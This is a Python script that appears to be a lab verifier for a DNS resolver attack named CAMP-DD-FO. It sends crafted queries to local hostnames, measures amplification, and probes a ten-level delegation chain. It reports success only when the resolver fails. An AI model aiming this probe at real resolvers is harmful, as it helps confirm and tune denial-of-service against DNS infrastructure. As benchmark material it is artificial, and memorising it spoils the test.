#!/usr/bin/env python3
"""Bounded CAMP DD-FO probe used by the local verifier."""
import json
import socket
import struct
import sys
import time

def packet(name: str, qtype: int = 1) -> bytes:
    labels = name.rstrip(".").split(".")
    qname = b"".join(bytes([len(label)]) + label.encode() for label in labels) + b"\0"
    return struct.pack("!HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0) + qname + struct.pack("!HH", qtype, 1)

def ask(host: str, name: str, timeout: float = 5.0) -> dict:
    query = packet(name)
    started = time.perf_counter()
    result = {"server": host, "name": name, "query_bytes": len(query), "response_bytes": None, "amplification_factor": None, "rcode": None, "answer_count": None, "authority_count": None, "additional_count": None, "latency_ms": None, "timeout": False}
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(query, (host, 53))
            response, _ = sock.recvfrom(65535)
        if len(response) < 12:
            raise ValueError("short DNS response")
        _ident, flags, _qd, an, ns, ar = struct.unpack("!HHHHHH", response[:12])
        result.update({"response_bytes": len(response), "amplification_factor": round(len(response) / len(query), 3), "rcode": flags & 0xF, "answer_count": an, "authority_count": ns, "additional_count": ar})
    except socket.timeout:
        result["timeout"] = True
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
    result["latency_ms"] = round((time.perf_counter() - started) * 1000, 3)
    return result

def main() -> int:
    primary = ask("primary", "trigger.example.com")
    resolver = ask("unbound", "trigger.example.com", timeout=8.0)
    depth = []
    for layer in range(10):
        labels = [f"l{i}" for i in range(layer + 1, -1, -1)]
        depth.append(ask(f"aux-{layer}", ".".join(labels) + ".example.com", timeout=3.0))
    payload = {"attack": "CAMP-DD-FO", "delegation_depth_expected": 10, "fanout_width_expected": 1, "primary_trigger": primary, "resolver_trigger": resolver, "delegation_probes": depth}
    print(json.dumps(payload, sort_keys=True), flush=True)
    primary_ok = primary.get("answer_count", 0) >= 1 and not primary.get("timeout")
    depth_ok = all(item.get("answer_count", 0) >= 1 for item in depth)
    resolver_failed = resolver.get("timeout") or (isinstance(resolver.get("rcode"), int) and resolver.get("rcode") != 0)
    return 0 if primary_ok and depth_ok and resolver_failed else 1

if __name__ == "__main__":
    raise SystemExit(main())
